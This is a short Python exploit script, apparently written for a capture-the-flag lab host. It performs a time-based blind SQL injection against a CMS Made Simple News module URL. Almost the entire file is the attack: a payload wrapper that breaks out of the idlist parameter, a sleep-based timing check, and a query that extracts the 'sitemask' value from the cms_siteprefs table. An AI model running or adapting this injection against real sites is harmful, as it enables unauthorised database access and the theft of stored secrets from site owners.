from functools import partial
import yasqlit_v24 as ya
import requests
import datetime

url = 'http://10.10.10.138/writeup/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=xx'


def pPayload(p):
    sqli = f'x,y,1,2)) and ({p});-- -'
    return sqli

def timePredicate(res):
    if res.elapsed > datetime.timedelta(seconds=2):
        return True
    else:
        return False

def pwn():
    t = ya.Transport(payloadProcessor=pPayload, predicate=timePredicate, requestPath='req-mod-interface.txt')
    # qry = 'SELECT @@version'
    # ya.boolExfiltrate(t, qry, 'mysql',timeBasedDelay=2)

    qry = 'SELECT sleep(2) FROM cms_siteprefs WHERE sitepref_value{operator}{guess} and sitepref_name like 0x736974656d61736b'
    pt = partial(qry.format)
    ya.boolExfiltrate(t, pt, 'mysql',timeBasedDelay=2, binarySearch=False)


pwn()